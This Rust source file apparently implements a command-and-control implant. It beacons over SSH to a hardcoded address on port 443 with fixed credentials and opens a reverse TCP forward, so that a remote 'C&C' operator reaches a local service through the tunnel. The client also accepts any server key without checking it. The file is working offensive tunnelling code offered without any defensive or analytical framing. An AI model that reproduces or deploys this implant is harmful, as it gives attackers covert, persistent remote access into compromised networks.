extern crate tokio;

use log::{debug, error, info, warn};
use std::sync::Arc;
use thrussh::*;
use thrussh_keys::*;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::Duration;

#[derive(Clone, Copy)]
struct Client {}

impl client::Handler for Client {
    type FutureUnit = futures::future::Ready<Result<(Self, client::Session), anyhow::Error>>;
    type FutureBool = futures::future::Ready<Result<(Self, bool), anyhow::Error>>;

    fn finished_bool(self, b: bool) -> Self::FutureBool {
        futures::future::ready(Ok((self, b)))
    }
    fn finished(self, session: client::Session) -> Self::FutureUnit {
        futures::future::ready(Ok((self, session)))
    }
    fn check_server_key(self, _server_public_key: &key::PublicKey) -> Self::FutureBool {
        self.finished_bool(true)
    }
}

#[tokio::main]
async fn main() {
    let config = thrussh::client::Config::default();
    let config = Arc::new(config);
    let sh = Client {};
    env_logger::init();

    loop {
        let config = Arc::clone(&config);
        let mut session = match thrussh::client::connect(config, "192.168.0.67:443", sh).await {
            Ok(s) => s,
            Err(e) => {
                error!("Error while connecting: {}", e);
                std::thread::sleep(Duration::from_millis(500));
                continue;
            }
        };
        // TODO secure this
        debug!("Awaiting session from server...");
        if session
            .authenticate_password("random", "random")
            .await
            .unwrap()
        {
            debug!("Awaiting channel opening from server...");
            let mut main_channel = session.channel_open_session().await.unwrap();

            debug!("Awaiting TCP/IP forwarding enabling from server...");
            main_channel
                .tcpip_forward(true, "localhost", 44321)
                .await
                .expect("Could not enable TCP/IP forwarding.");
            loop {
                debug!("Waiting for a forwarding request to come in...");
                let mut forwarding_channel = session.channel_accept_forwarding().await.unwrap();
                let mut stream = match TcpStream::connect("0.0.0.0:9000").await {
                    Ok(st) => st,
                    Err(e) => {
                        error!("Could not connect to server: {:?}", e);
                        return;
                    }
                };
                info!("C&C connection established.");
                let mut buf = vec![0; 4096];

                loop {
                    tokio::select! {
                        msg = forwarding_channel.wait() => {
                            debug!("Received message from C&C");
                            match msg {
                                Some(ChannelMsg::Data { data }) => {
                                    stream.write_all(&data).await.unwrap();
                                },
                                Some(ChannelMsg::Eof) => {
                                    info!("C&C disconnected");
                                    break;
                                },
                                m => warn!("Something else was received from the forwarding channel: {:?}", &m),
                            };
                        }
                        msg = stream.read(&mut buf) => {
                            match msg {
                                Ok(0) => (),
                                Ok(n) => {
                                    buf.resize(n, 0);
                                    forwarding_channel.data(&buf).await.unwrap();
                                }
                                Err(e) => {
                                    warn!("{:?} happened when reading from the server.", e);
                                }
                            }
                            buf = vec![0; 4096];
                        }
                    }
                    std::thread::sleep(Duration::from_millis(50));
                }
            }
        } else {
            error!("Authentication error.");
            break;
        }
    }
}
